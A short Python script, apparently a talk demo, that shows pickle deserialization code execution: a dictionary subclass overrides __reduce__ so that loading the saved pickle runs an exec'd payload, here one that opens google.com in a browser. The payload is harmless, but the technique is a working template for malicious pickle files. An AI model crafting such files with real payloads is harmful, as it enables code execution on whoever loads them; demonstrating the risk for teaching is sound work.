import pickle

PAYLOAD = """
import webbrowser
webbrowser.open("https://google.com")
"""


class MyDictionary(dict):
    def __reduce__(self):
        return eval, (f"exec('''{PAYLOAD}''') or dict()",)


def main():
    data = MyDictionary(event="GeekDays", date="2023-09-06")
    print(data)

    # --------------------------
    # Save pickle

    with open('pickle.pkl', 'wb+') as f:
        pickle.dump(data, f)

    # --------------------------
    # Load pickle

    with open('pickle.pkl', 'rb') as f:
        loaded_data = pickle.load(f)
        print(loaded_data)


if __name__ == '__main__':
    main()
